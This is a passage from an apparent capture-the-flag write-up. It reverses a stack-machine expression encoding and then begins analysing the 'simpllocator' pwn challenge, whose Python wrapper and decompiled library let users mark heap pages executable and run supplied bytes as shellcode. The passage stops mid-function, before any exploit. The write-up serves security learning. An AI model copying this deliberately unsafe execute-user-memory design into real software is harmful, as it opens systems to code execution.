+</span></span><span style="display:flex;"><span>1-1 in memory
+</span></span><span style="display:flex;"><span>0x555555598360: 0x8000  0x0001  0x8000  0x0001  0x8011
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1*1 in memory
+</span></span><span style="display:flex;"><span>0x555555598360: 0x8000  0x0001  0x8000  0x0001  0x8012
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1/1 in memory
+</span></span><span style="display:flex;"><span>0x555555598360: 0x8000  0x0001  0x8000  0x0001  0x8013
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>So we can see that numbers are stored in 2 bytes,  
+</span></span><span style="display:flex;"><span>in front of every number there is a 0x8000, and that  
+</span></span><span style="display:flex;"><span>+: 0x8010  
+</span></span><span style="display:flex;"><span>-: 0x8011  
+</span></span><span style="display:flex;"><span>*: 0x8012  
+</span></span><span style="display:flex;"><span>/: 0x8013  
+</span></span></code></pre></div><p>Further analysing by chaining expressions</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>1+2-3*4/5 in memory
+</span></span><span style="display:flex;"><span>0x555555597b10: 0x8000  0x0001  0x8000  0x0002  0x8010  0x8000  0x0003  0x8000
+</span></span><span style="display:flex;"><span>0x555555597b20: 0x0004  0x8012  0x8000  0x0005  0x8013  0x8011
+</span></span></code></pre></div><p>We then realised this is just an implementation of a stack machine, and that <code>0x8000</code> was just a push instruction, and <code>0x8011,0x8012,...</code>just performs an operation on the top two values on the stack.</p>
+<p>So now that we know how the expression is saved in memory, we can look at the expression that is compared, and try to mimic that expression.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>0x8000  0x0003  0x8000  0x0002  0x8000  0x0005  0x8012  0x8000  0x0004  0x8011  
+</span></span><span style="display:flex;"><span>0x8010  0x8000  0x0007  0x8000  0x0006  0x8000  0x0003  0x8013  0x8012  0x8010
+</span></span></code></pre></div><p>Reversing this expression using the info above, we can deduce that the final expression should be <code>(3+((2*5)-4))+(7*(6/3))</code>.</p>
+<h3 id="simpllocator-pwn">simpllocator (pwn)<a hidden class="anchor" aria-hidden="true" href="#simpllocator-pwn">#</a></h3>
+<p>There is a python file which loads a library ELF file called <code>simpllocator.so</code>. and allows us to interact with the functions of the library by sending json data</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> socket <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ctypes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lib <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./simpllocator.so&#39;</span>
+</span></span><span style="display:flex;"><span>funcs <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>cdll<span style="color:#f92672">.</span>LoadLibrary(lib)
+</span></span><span style="display:flex;"><span>print(funcs)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># void init()</span>
+</span></span><span style="display:flex;"><span>init <span style="color:#f92672">=</span> funcs<span style="color:#f92672">.</span>init
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># int allocate()</span>
+</span></span><span style="display:flex;"><span>allocate <span style="color:#f92672">=</span> funcs<span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>allocate<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int <span style="color:#75715e"># prob is return type</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># int insert(fd, ptr, sz)</span>
+</span></span><span style="display:flex;"><span>insert <span style="color:#f92672">=</span> funcs<span style="color:#f92672">.</span>insert
+</span></span><span style="display:flex;"><span>insert<span style="color:#f92672">.</span>argtypes <span style="color:#f92672">=</span> [ctypes<span style="color:#f92672">.</span>c_int, ctypes<span style="color:#f92672">.</span>POINTER(ctypes<span style="color:#f92672">.</span>c_int8), ctypes<span style="color:#f92672">.</span>c_int] <span style="color:#75715e"># prob is argument type</span>
+</span></span><span style="display:flex;"><span>insert<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># int delete(fd)</span>
+</span></span><span style="display:flex;"><span>delete <span style="color:#f92672">=</span> funcs<span style="color:#f92672">.</span>delete
+</span></span><span style="display:flex;"><span>delete<span style="color:#f92672">.</span>argtypes <span style="color:#f92672">=</span> [ctypes<span style="color:#f92672">.</span>c_int]
+</span></span><span style="display:flex;"><span>delete<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># int mprotect(fd, flag)</span>
+</span></span><span style="display:flex;"><span>mprotect <span style="color:#f92672">=</span> funcs<span style="color:#f92672">.</span>fd_mprotect
+</span></span><span style="display:flex;"><span>mprotect<span style="color:#f92672">.</span>argtypes <span style="color:#f92672">=</span> [ctypes<span style="color:#f92672">.</span>c_int, ctypes<span style="color:#f92672">.</span>c_int]
+</span></span><span style="display:flex;"><span>mprotect<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># int execute(fd)</span>
+</span></span><span style="display:flex;"><span>execute <span style="color:#f92672">=</span> funcs<span style="color:#f92672">.</span>execute
+</span></span><span style="display:flex;"><span>execute<span style="color:#f92672">.</span>argtypes <span style="color:#f92672">=</span> [ctypes<span style="color:#f92672">.</span>c_int]
+</span></span><span style="display:flex;"><span>execute<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_args</span>(args):
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> list()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> args:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># in json data, have to mention type also</span>
+</span></span><span style="display:flex;"><span>        type <span style="color:#f92672">=</span> arg[<span style="color:#e6db74">&#39;type&#39;</span>]
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> arg[<span style="color:#e6db74">&#39;data&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;INT&#39;</span>:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int(arg[<span style="color:#e6db74">&#39;data&#39;</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;PTR&#39;</span>:
+</span></span><span style="display:flex;"><span>            decoded <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(arg[<span style="color:#e6db74">&#39;data&#39;</span>])
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;data&#39;</span> : (ctypes<span style="color:#f92672">.</span>c_int8 <span style="color:#f92672">*</span> len(decoded))(<span style="color:#f92672">*</span>decoded), <span style="color:#e6db74">&#39;len&#39;</span> : ctypes<span style="color:#f92672">.</span>c_int(len(decoded))}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        res<span style="color:#f92672">.</span>append(data)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>init()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Hello! This is Simpllocator!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    argc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    received <span style="color:#f92672">=</span> input()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        received <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(received)
+</span></span><span style="display:flex;"><span>        callNum <span style="color:#f92672">=</span> received[<span style="color:#e6db74">&#39;callNum&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> received[<span style="color:#e6db74">&#39;args&#39;</span>] <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            argc <span style="color:#f92672">=</span> len(received[<span style="color:#e6db74">&#39;args&#39;</span>])
+</span></span><span style="display:flex;"><span>            args <span style="color:#f92672">=</span> received[<span style="color:#e6db74">&#39;args&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> callNum <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;fd[</span><span style="color:#e6db74">{</span>allocate()<span style="color:#e6db74">}</span><span style="color:#e6db74">] created.&#34;</span>) <span style="color:#75715e"># allocate is called here</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> callNum <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">or</span> received[<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;INT&#39;</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            c_args <span style="color:#f92672">=</span> parse_args(args)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> c_args <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> insert(c_args[<span style="color:#ae81ff">0</span>], c_args[<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#39;data&#39;</span>],c_args[<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#39;len&#39;</span>]): <span style="color:#75715e"># !!! the 2nd arg is just a string</span>
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Data inserted at fd[</span><span style="color:#e6db74">{</span>received[<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;data&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> callNum <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> received[<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;INT&#39;</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            c_args <span style="color:#f92672">=</span> parse_args(args)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> delete(c_args[<span style="color:#ae81ff">0</span>]):
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;fd[</span><span style="color:#e6db74">{</span>received[<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;data&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">] was deleted.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> callNum <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">or</span> received[<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;INT&#39;</span> <span style="color:#f92672">or</span> received[<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;INT&#39;</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            c_args <span style="color:#f92672">=</span> parse_args(args)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> mprotect(c_args[<span style="color:#ae81ff">0</span>], c_args[<span style="color:#ae81ff">1</span>]):
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;fd[</span><span style="color:#e6db74">{</span>received[<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;data&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">] permission changed.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> callNum <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> received[<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;INT&#39;</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            c_args <span style="color:#f92672">=</span> parse_args(args)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> execute(c_args[<span style="color:#ae81ff">0</span>]):
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;fd[</span><span style="color:#e6db74">{</span>received[<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;data&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">] was executed.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span></code></pre></div><p>so how you interact with the functions is by sending json data like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;callNum&#34;</span>: <span style="color:#960050;background-color:#1e0010">...</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;args&#34;</span>: [
+</span></span><span style="display:flex;"><span>        { <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;...&#34;</span>, <span style="color:#f92672">&#34;data&#34;</span>: <span style="color:#960050;background-color:#1e0010">...</span> },
+</span></span><span style="display:flex;"><span>        { <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;...&#34;</span>, <span style="color:#f92672">&#34;data&#34;</span>: <span style="color:#960050;background-color:#1e0010">...</span> }
+</span></span><span style="display:flex;"><span>            ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>taking a look at the library functions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">init</span>(EVP_PKEY_CTX <span style="color:#f92672">*</span>ctx){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdin,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stderr,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  pagesize <span style="color:#f92672">=</span> <span style="color:#a6e22e">sysconf</span>(<span style="color:#ae81ff">0x1e</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1040f0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">allocate</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  undefined4 <span style="color:#f92672">*</span>__s;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  __s <span style="color:#f92672">=</span> (undefined4 <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(pagesize);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(__s,<span style="color:#ae81ff">0</span>,pagesize);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>__s <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">createfd</span>(__s);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">createfd</span>(undefined8 param_1){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> idx;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>( true ) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">9</span> <span style="color:#f92672">&lt;</span> idx) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(fds <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>; <span style="color:#75715e">// fds is a global variable
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    idx <span style="color:#f92672">=</span> idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(fds <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> param_1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> idx;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">insert</span>(uint param_1,<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>param_2,uint param_3){
+</span></span><span style="display:flex;"><span>  undefined8 uVar1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(fds <span style="color:#f92672">+</span> (ulong)param_1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pagesize <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">&lt;</span> param_3) {
+</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memcpy</span>((<span style="color:#f92672">*</span>(fds <span style="color:#f92672">+</span> param_1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>),param_2,param_3);
+</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar1;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fd_mprotect</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">int</span> param_2){
+</span></span><span style="display:flex;"><span>  undefined4 <span style="color:#f92672">*</span>chunkPtr;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  chunkPtr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(fds <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (chunkPtr <span style="color:#f92672">==</span> (undefined4 <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (param_2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mprotect</span>((chunkPtr <span style="color:#f92672">&amp;</span> <span style="color:#f92672">-</span>pagesize),pagesize,<span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>chunkPtr <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (param_2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>        iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mprotect</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((ulong)chunkPtr <span style="color:#f92672">&amp;</span> <span style="color:#f92672">-</span>pagesize),pagesize <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">7</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// makes it executable?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>chunkPtr <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        iVar2 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iVar2;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">execute</span>(<span style="color:#66d9ef">int</span> param_1,undefined8 param_2){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>piVar1;
+</span></span><span style="display:flex;"><span>  undefined8 uVar2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  piVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">**</span>)(fds <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (piVar1 <span style="color:#f92672">==</span> (<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>piVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// execute shellcode starting from second byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      (<span style="color:#f92672">*</span>(piVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))(param_1,param_2,piVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>      uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar2;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">delete</span>(uint param_1){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>__ptr;
+</span></span><span style="display:flex;"><span>  undefined8 uVar1;
+</span></span><span style="display:flex;"><span>
